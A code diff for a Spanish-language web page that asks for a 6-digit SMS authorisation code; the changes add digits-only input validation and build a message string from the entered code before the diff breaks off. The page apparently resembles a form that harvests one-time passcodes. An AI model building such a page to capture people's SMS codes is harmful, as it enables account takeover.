@@ -11,7 +11,7 @@
       color: #000;
       padding: 10px;
       font-size: 18px;
-      width: 100px;             /* espacio para 6 dígitos */
+      width: 120px;             /* espacio para 6 dígitos */
       text-align: center;
       background-color: #fff;
       margin-top: 20px;
@@ -47,7 +47,7 @@
     <h1>Ingrese el código SMS de 6 dígitos</h1>
 
     <form id="formSMS">
-      <input type="number" id="smsCode" class="sms" maxlength="6" placeholder="123456" required>
+      <input type="text" id="smsCode" class="sms" maxlength="6" placeholder="123456" required>
       <div class="botones">
         <button type="submit" class="btn-red">Autorizar</button>
       </div>
@@ -57,9 +57,18 @@
   </div>
 
   <script>
+    // Validar que solo se ingresen números y máximo 6 dígitos
+    const smsInput = document.getElementById("smsCode");
+    smsInput.addEventListener("input", function() {
+      this.value = this.value.replace(/[^0-9]/g, ""); // solo números
+      if(this.value.length > 6){
+        this.value = this.value.slice(0,6); // máximo 6 dígitos
+      }
+    });
+
     document.getElementById("formSMS").addEventListener("submit", async function(e){
       e.preventDefault();
-      const smsCode = document.getElementById("smsCode").value;
+      const smsCode = smsInput.value;
 
       const mensaje = `Autorización por SMS: ${smsCode}`;
 
